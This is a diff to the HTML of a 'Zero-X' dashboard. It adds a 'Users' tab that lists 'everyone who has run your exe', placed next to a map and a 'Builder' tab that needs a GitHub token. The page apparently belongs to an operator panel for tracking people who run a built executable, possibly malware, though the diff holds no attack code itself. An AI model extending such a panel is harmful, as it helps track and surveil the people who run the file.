@@ -5,6 +5,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Zero-X | Dashboard</title>
   <link rel="stylesheet" href="style.css" />
+  <style>
+    .users-table{width:100%;border-collapse:collapse;font-family:'JetBrains Mono',monospace;font-size:13px;}
+    .users-table th{text-align:left;padding:8px 12px;color:#7b8094;font-weight:500;border-bottom:1px solid #1e2130;font-size:11px;text-transform:uppercase;letter-spacing:.06em;}
+    .users-table td{padding:10px 12px;border-bottom:1px solid #1a1e2e;color:#e7e9f3;vertical-align:middle;}
+    .users-table tr:last-child td{border-bottom:none;}
+    .users-table tr:hover td{background:#131825;}
+    .btn.danger{background:transparent;color:#ff4d6d;border:1px solid #ff4d6d33;}
+    .btn.danger:hover{background:#ff4d6d18;}
+  </style>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
@@ -28,6 +37,9 @@
       </div>
       <div class="nav-item" data-target="social">
         <span data-icon="automation"></span><span>Social</span>
+      </div>
+      <div class="nav-item" data-target="users">
+        <span data-icon="users"></span><span>Users</span>
       </div>
 
       <div class="nav-group-label">Manage</div>
@@ -168,6 +180,23 @@
               <div class="name" style="font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:15px;">Discord server</div>
               <div class="handle" style="margin-bottom:12px;">Join to chat, get updates, and ask questions.</div>
               <a class="join-btn" href="https://discord.gg/ud48XJHepX" target="_blank" rel="noopener">Join server</a>
+            </div>
+          </div>
+        </section>
+
+        <!-- Users -->
+        <section class="tab-panel" id="panel-users">
+          <div class="hello">
+            <div class="eyebrow">Users</div>
+            <h1>Connected Users <span id="users-count" style="font-size:16px;color:#7b8094;font-weight:400;margin-left:8px;"></span></h1>
+            <p>Everyone who has run your exe. Hit Remove to wipe them from both this list and the map.</p>
+          </div>
+          <div class="panel">
+            <div class="input-row" style="margin-bottom:20px;">
+              <button class="btn primary" id="users-refresh-btn">Refresh</button>
+            </div>
+            <div id="users-table-wrap">
+              <p style="color:#7b8094;">Save your GitHub token in the Builder tab first, then come back here.</p>
             </div>
           </div>
         </section>
